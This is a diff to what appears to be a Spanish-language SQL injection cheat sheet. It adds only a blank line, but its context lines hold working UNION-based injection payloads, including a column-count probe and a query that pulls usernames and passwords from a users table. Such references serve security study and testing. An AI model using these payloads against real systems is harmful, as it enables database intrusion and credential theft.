@@ -11,6 +11,7 @@ COMMON QUERY: ```SELECT a, b FROM table1 UNION SELECT c, d FROM table2```
 Determinar el número de columnas: ```' ORDER BY 1--```
 
 MySQL: ```' UNION SELECT '1','2','3','4'-- -```
+
 ORACLE: ```' UNION SELECT NULL FROM DUAL--```
 
 CONCATENATION:  ```' UNION SELECT username || '~' || password FROM users-- ```
